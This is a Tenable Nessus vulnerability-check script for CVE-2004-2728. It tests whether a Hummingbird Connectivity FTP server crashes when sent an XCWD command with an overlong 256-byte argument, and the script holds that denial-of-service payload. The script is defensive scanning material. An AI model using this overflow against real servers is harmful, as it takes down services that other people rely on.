#TRUSTED 6045f16518c9186a83fa13aae3cd72bd766f574cb09f9840ac9d26293e4fd1da76ac537f9634fb89a1ecd3cf7a292b6302d1c308ccf8945c0ebe88ee6740f53fb479949f62a89be11b1b12b317e1ef90ff6592379dfc9f0882c4c4c72ccb7e48edae4d204da7157454640d4089bc0fa77f64392f62544f20c01ca76d46dacce787911540682c03fc50ecf25d1f9a699ef333866b12bef0e71f2c0f0d7cf7d9f92fa21380fb0ff50862e2dde4bf2245fca1abdaeece75a2196d03226abe7fe87979373a34a90077b15bce0eb19d9edd4adb1bf464f7bd90fb008702a4527fe0b1d4521ed5635d6f78884ce4fb4541be69bcd771fe8988643653def8f868c60c6d88ea1c683c481f2ecdd4962412a00453d217844e80f167c43fdb09434c0e87b01beea11cf5f34640a1f62cf7bb1ff36bbf85916479cefcc77b065672cd782c9cdfe09960d380c37d27e30ab9e30d42474e97666a8acbab4a4a1c0d0e7b80b7207af6803d42e10b701171e397de9734b42fe1801d4a618300d749efd99e13affad5d7e2d21a55114a62d6e8f3ab23a82692d4753ab2d8b3b5c4fae145466d774e5eb945bfa9e521c71d5ddcf0ffe4d46d107720afb6be047c073ecfaf41e121fa4df248958d5cd5d9fc564ccf45ecced3c65bddf4c5b6b6a59130e5178f2aa7466467636e61b82a62b155d2ced95d8e5b666adf869160ee1be37b24c3ca90ea3a
#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(15613);
  script_version("1.21");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/02/11");

  script_cve_id("CVE-2004-2728");
  script_bugtraq_id(11542);

  script_name(english:"Hummingbird Connectivity FTP Service XCWD Command Overflow");

  script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow vulnerability." );
  script_set_attribute(attribute:"description", value:
"The remote host is running the Hummingbird Connectivity FTP server.

It was possible to shut down the remote FTP server by issuing a XCWD
command followed by a too long argument.

This problem allows an attacker to prevent the remote site
from sharing some resources with the rest of the world." );
  script_set_attribute(attribute:"see_also", value:"http://connectivity.hummingbird.com/" );
  script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:S/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:U/RL:U/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2004-2728");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_cwe_id(119);

  script_set_attribute(attribute:"vuln_publication_date", value: "2004/12/31");
  script_set_attribute(attribute:"plugin_publication_date", value: "2004/12/31");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_summary(english:"Attempts a XCWD buffer overflow");
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");
  script_family(english:"FTP");
  script_dependencies("ftp_anonymous.nasl", "ftpserver_detect_type_nd_version.nasl");
  script_require_keys("ftp/login");
  script_require_ports("Services/ftp", 21);

 exit(0);
}

#
# The script code starts here
#

include('ftp_func.inc');

var port = get_ftp_port(default: 21);
var login = get_kb_item("ftp/login");
var password = get_kb_item("ftp/password");

var soc = ftp_open_and_authenticate( user:login, pass:password, port:port );
if(!soc)
{
  exit(0);
}

var s = "XCWD "+ crap(256) +'\r\n';
send(socket:soc, data:s);
recv_line(socket:soc, length:1024);
close(soc);

for (var i = 0; i < 3; i ++)
{
 var soc = open_sock_tcp(port);
 if(soc)
 {
   close(soc);
   exit(0);
 }
 sleep(1);
}

security_report_v4(port:port, severity:SECURITY_NOTE);

